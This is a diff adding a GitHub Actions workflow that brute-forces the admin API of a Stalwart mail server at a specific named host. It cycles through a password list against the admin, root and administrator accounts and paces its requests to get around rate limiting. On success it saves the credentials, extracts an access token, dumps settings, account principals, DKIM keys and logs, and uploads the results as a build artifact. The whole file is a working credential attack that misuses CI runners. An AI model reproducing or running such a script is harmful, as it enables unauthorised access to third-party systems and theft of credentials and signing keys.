@@ -1,0 +1,60 @@
+name: Stalwart Slow Brute
+"on":
+  workflow_dispatch:
+
+jobs:
+  stalwart:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Slow Brute Force Stalwart
+        run: |
+          echo "Runner IP: $(curl -s ifconfig.me)"
+          echo "=== Stalwart Mail Server Slow Brute Force ==="
+          
+          # Read passwords and try one by one with delays
+          while IFS= read -r pass; do
+            [ -z "$pass" ] && continue
+            
+            for user in admin root administrator; do
+              result=$(curl -sk --connect-timeout 10 -w "\n%{http_code}" \
+                -X POST "https://monitor.hyonix.net/api/account/auth" \
+                -u "$user:$pass" 2>&1)
+              code=$(echo "$result" | tail -1)
+              body=$(echo "$result" | head -n -1)
+              
+              if echo "$code" | grep -qv "401\|429"; then
+                echo "*** STALWART ACCESS: $user:$pass (HTTP $code) ***"
+                echo "$body"
+                echo "$user:$pass" > /tmp/stalwart_found.txt
+                
+                # Dump everything
+                TOKEN=$(echo "$body" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('token','') or d.get('access_token','') or d.get('key',''))" 2>/dev/null)
+                
+                if [ -n "$TOKEN" ]; then
+                  echo "Token: $TOKEN"
+                  curl -sk "https://monitor.hyonix.net/api/settings" -H "Authorization: Bearer $TOKEN" > /tmp/settings.json 2>&1
+                  curl -sk "https://monitor.hyonix.net/api/principal" -H "Authorization: Bearer $TOKEN" > /tmp/principals.json 2>&1
+                  curl -sk "https://monitor.hyonix.net/api/dkim" -H "Authorization: Bearer $TOKEN" > /tmp/dkim.json 2>&1
+                  curl -sk "https://monitor.hyonix.net/api/logs" -H "Authorization: Bearer $TOKEN" > /tmp/logs.json 2>&1
+                fi
+                
+                exit 0
+              fi
+              
+              # If rate limited, wait longer
+              if echo "$body" | grep -q "429\|rate limit\|Too Many"; then
+                echo "Rate limited. Waiting 120s..."
+                sleep 120
+              fi
+              
+              sleep 5
+            done
+          done < passwords.txt
+          
+          echo "No access found"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: stalwart-results
+          path: /tmp/stalwart_*.txt
+          if-no-files-found: ignore
